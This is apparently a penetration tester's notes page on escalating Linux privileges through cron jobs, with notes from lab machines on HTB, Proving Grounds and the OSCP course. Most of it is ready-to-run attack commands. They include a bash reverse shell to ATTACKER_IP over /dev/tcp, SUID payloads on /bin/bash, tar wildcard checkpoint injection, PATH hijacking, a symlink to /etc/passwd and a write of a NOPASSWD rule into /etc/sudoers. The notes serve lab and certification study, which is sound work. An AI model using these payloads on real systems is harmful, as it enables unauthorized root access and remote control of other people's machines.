# Cron Job Exploitation

Back to [[Linux-PrivEsc-Methodology]]

## Enumerate
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
crontab -l
crontab -l -u username
```

### Use pspy (see cron without root)
```bash
# Upload pspy64 (or pspy32 for 32-bit)
chmod +x pspy64
./pspy64
# Watch for periodic root processes
```

## Writable Cron Script

If a cron job runs a script you can write to:
```bash
# Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' >> /opt/backup.sh

# Or SUID bash
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Wait for cron, then:
/bin/bash -p
REDACTED

## Wildcard Injection (tar)

If cron runs something like: `cd /some/dir && tar czf backup.tar.gz *`
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' > /some/dir/shell.sh
echo '' > '/some/dir/--checkpoint=1'
echo '' > '/some/dir/--checkpoint-action=exec=sh shell.sh'
```
The `*` expands the filenames as tar arguments.

## PATH Abuse in Cron

If `/etc/crontab` has `PATH=/home/user:/usr/local/bin:/usr/bin` and a cron script calls a command without full path:
```bash
# Create malicious version in the first writable PATH dir
echo '#!/bin/bash' > /home/user/command_name
echo 'chmod +s /bin/bash' >> /home/user/command_name
chmod +x /home/user/command_name
# Wait for cron, then:
/bin/bash -p
REDACTED

## Overwrite Cron Script via Symlink

If cron runs a script in a writable directory:
```bash
rm /writable/dir/script.sh
ln -s /etc/passwd /writable/dir/script.sh
# Or replace with your own script
```

---

## From Your Boxes

> **TartarSauce** (HTB) — pspy revealed a cron running tar with wildcards every 5 minutes as root
> - What worked: Tar wildcard injection via checkpoint arguments
> - Lesson: Always run pspy. Cron jobs may not be visible in /etc/crontab but show up in process monitoring.

> **Bashed** (HTB) — All .py scripts in /scripts/ directory were run by cron every few minutes
> - What worked: Dropped a python reverse shell script in the directory
> - Lesson: If cron runs everything in a directory, just drop your payload there.

> **Networked** (HTB) — check_attack.php ran as cron every 3 minutes, processing files from uploads dir
> - What worked: Crafted a malicious filename with command injection to get shell as user guly
> - Lesson: Cron scripts that process filenames can be exploited through malicious filename injection.

> **CMS101** (VHL) — Cron job used relative path for "logs" directory
> - What worked: Exploited relative path in cron to redirect execution
> - Lesson: Relative paths in cron = PATH hijacking. Create your binary earlier in PATH.

> **Exfiltrated** (PG) — Linpeas found a cron job; exploited it to add SUID to /bin/bash
> - What worked: Modified cron-executed script to run `chmod +s /bin/bash`, then `/bin/bash -p`
> - Lesson: If you can write to a cron-executed script, `chmod +s /bin/bash` is the most reliable payload.

> **Readys** (PG) — Root cron running a writable shell script in /etc/crontab
> - What worked: Replaced script contents with `echo 'apache ALL=(root) NOPASSWD: ALL' > /etc/sudoers`
> - Lesson: Overwriting /etc/sudoers via cron is a clean privesc. Verify with pspy, then re-login and run sudo -l.

> **Flu** (PG) — pspy revealed root cron running a writable script
> - What worked: Replaced script with reverse shell, waited for cron execution
> - Lesson: pspy is essential. Some cron jobs only appear in process monitoring, not in crontab files.

> **LaVita** (PG) — pspy32s revealed root cron running a script, which was writable
> - What worked: Injected reverse shell into the cron-executed script
> - Lesson: pspy works in both 32-bit and 64-bit variants. Always transfer the right one.

> **Ochima** (PG) — Linpeas identified a writable cron file
> - What worked: Modified the cron-executed file to spawn a reverse shell
> - Lesson: Linpeas highlights writable cron scripts. Trust its output.

> **OSCP C - Charlie** (Course) — Cron running tar with wildcards from /etc/cron.d/2minutes
> - What worked: Tar wildcard checkpoint injection to get reverse shell as root
> - Lesson: tar + wildcard + cron is an OSCP classic. Know the checkpoint exploit by heart.
